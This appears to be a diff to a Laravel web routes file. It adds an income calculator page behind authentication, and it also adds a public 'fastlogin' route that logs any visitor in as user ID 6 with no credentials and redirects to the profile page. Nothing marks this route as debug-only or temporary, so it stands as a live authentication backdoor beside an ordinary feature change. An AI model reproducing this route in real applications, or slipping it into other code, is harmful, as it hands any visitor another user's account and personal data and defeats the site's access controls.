@@ -9,6 +9,7 @@ use App\Http\Controllers\SocialsController;
 use App\Http\Controllers\SuggestionsController;
 use App\Http\Controllers\UserController;
 use App\Http\Controllers\UserProfileController;
+use App\Http\Controllers\IncomeCalculatorController;
 use App\Http\Middleware\CanSeeContract;
 use App\Models\Tariff;
 use Illuminate\Support\Facades\Artisan;
@@ -61,6 +62,13 @@ Route::middleware('guest')->group(function () {
         ->where('driver', 'yandex|vkontakte|google');
 });
 
+    Route::get('fastlogin', function () {
+        Auth::loginUsingId(6);
+        return redirect()->route('users.profile');
+    });
+
+
+
 Route::prefix('personal')
     ->middleware('auth')->group(function () {
         Route::get('profile', [UserProfileController::class, 'profile'])
@@ -108,6 +116,11 @@ Route::prefix('personal')
             ->middleware('can:see own profile')
             ->name('contracts.cancel_change');
 
+            Route::get('income_calculator', [IncomeCalculatorController::class, 'show'])
+            ->middleware('can:see own profile')
+            ->name('income_calculator');
+     
+            
         Route::get('payments', [PaymentController::class, 'indexForUser'])
             ->middleware('can:see own profile')
             ->name('payments.for_user');
